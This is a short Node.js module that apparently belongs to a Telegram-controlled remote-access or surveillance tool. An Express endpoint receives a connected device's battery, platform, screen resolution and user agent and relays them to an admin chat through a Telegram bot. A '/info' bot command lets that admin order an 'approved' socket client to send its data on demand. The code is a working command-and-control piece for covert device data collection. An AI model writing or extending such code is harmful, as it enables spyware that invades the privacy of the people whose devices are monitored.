module.exports = function(app) {
    app.post('/upload-info', (req, res) => {
        const info = req.body;
        const infoText = `📊 **Device Specs & Battery (${global.pendingUsername}):**\n\n🔋 Battery: \`${info.battery}\`\n💻 Platform: \`${info.platform}\`\n🖥️ Resolution: \`${info.screen}\`\n🌐 User-Agent: \`${info.userAgent}\``;
        
        global.bot.sendMessage(global.adminId, infoText, { parse_mode: 'Markdown' });
        res.status(200).send({ success: true });
    });

    global.bot.onText(/\/info/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() === global.adminId.toString()) {
            if (global.approvedSocketId) {
                global.bot.sendMessage(chatId, "🔍 Fetching Device Info...");
                global.io.to(global.approvedSocketId).emit('get_info');
            } else {
                global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
            }
        }
    });
};
